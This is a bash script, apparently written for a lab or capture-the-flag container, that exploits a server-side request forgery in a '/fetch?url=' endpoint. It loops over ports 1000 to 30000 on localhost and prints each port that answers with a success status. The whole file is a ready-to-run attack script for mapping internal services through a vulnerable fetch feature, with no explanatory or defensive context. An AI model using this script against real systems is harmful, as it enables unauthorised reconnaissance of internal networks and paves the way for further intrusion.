#!/bin/bash

# Base URL for the public-facing service
base_url="http://localhost/fetch?url="

# Targeting localhost within the container
internal_host="http://localhost"

# Range of ports to brute force (you can adjust this range)
start_port=1000
end_port=30000

# Loop through the port range and make a request to each one
for port in $(seq $start_port $end_port); do
    target_url="${internal_host}:${port}"
    full_url="${base_url}${target_url}"
    
    # Make a request to the /fetch endpoint and store the result
    response=$(curl -s "$full_url")

    # Check if the response contains content and does not have error messages
    if [ -n "$response" ] && [ "$(echo "$response" | grep -c '"status":"success"')" -eq 1 ]; then
        echo "Port $port responded: $response"
    fi
done
